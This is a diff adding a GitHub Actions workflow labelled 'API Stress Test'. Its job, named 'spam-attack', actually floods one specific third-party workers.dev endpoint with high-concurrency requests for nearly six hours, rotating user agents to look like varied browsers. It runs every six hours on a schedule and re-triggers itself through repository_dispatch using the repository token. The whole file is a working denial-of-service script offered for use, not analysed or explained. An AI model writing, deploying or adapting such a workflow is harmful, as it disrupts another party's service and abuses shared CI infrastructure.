@@ -1,0 +1,88 @@
+name: API Stress Test
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+  repository_dispatch:
+    types: [restart-spam]
+
+jobs:
+  spam-attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+    
+    - name: Install dependencies
+      run: |
+        pip install aiohttp
+        
+    - name: Start API Spam
+      run: |
+        python3 -c "
+import asyncio
+import aiohttp
+import random
+import time
+
+TARGET_URL = 'https://locket-vip.heehe0009.workers.dev/user/check?username=ebethaodayy'
+CONCURRENT_REQUESTS = 150
+DURATION_MINUTES = 355
+
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+]
+
+async def make_request(session):
+    headers = {'User-Agent': random.choice(USER_AGENTS)}
+    try:
+        async with session.get(TARGET_URL, headers=headers, timeout=5) as response:
+            return response.status
+    except:
+        return 0
+
+async def spam_worker(worker_id):
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for _ in range(CONCURRENT_REQUESTS):
+            task = asyncio.create_task(make_request(session))
+            tasks.append(task)
+        
+        start_time = time.time()
+        request_count = 0
+        
+        while time.time() - start_time < (DURATION_MINUTES * 60):
+            for i, task in enumerate(tasks):
+                if task.done():
+                    status = await task
+                    request_count += 1
+                    if request_count % 500 == 0:
+                        print(f'Worker {worker_id}: Requests={request_count}')
+                    tasks[i] = asyncio.create_task(make_request(session))
+            
+            await asyncio.sleep(0.001)
+
+async def main():
+    workers = [spam_worker(i) for i in range(10)]
+    await asyncio.gather(*workers)
+    print('Spam completed!')
+
+if __name__ == '__main__':
+    asyncio.run(main())
+        "
+    
+    - name: Auto-restart
+      if: always()
+      run: |
+        sleep 5
+        curl -X POST \
+          -H "Accept: application/vnd.github+json" \
+          -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+          https://api.github.com/repos/${{ github.repository }}/dispatches \
+          -d '{"event_type": "restart-spam"}'
